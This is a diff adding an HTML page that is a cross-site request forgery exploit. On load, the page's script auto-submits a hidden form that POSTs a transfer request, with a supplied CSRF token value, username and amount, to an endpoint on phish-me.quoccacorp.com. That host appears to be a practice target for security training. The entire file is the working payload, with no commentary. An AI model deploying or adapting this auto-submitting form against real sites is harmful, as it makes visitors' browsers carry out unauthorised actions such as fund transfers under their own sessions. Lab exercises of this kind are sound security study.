@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+ <head>
+   <script>
+     window.onload = function () {
+       document.getElementById("autoForm").submit();
+     };
+   </script>
+ </head>
+ <body>
+   <form
+     id="autoForm"
+     method="POST"
+     action="https://phish-me.quoccacorp.com/api/transfer"
+   >
+     <input type="hidden" name="csrf_token" value="NjYyNg==" />
+     <input type="text" name="username" value="z5519242" />
+     <input type="number" name="amount" value="1" />
+     <input type="submit" value="transfer" />
+   </form>
+ </body>
+</html>
+
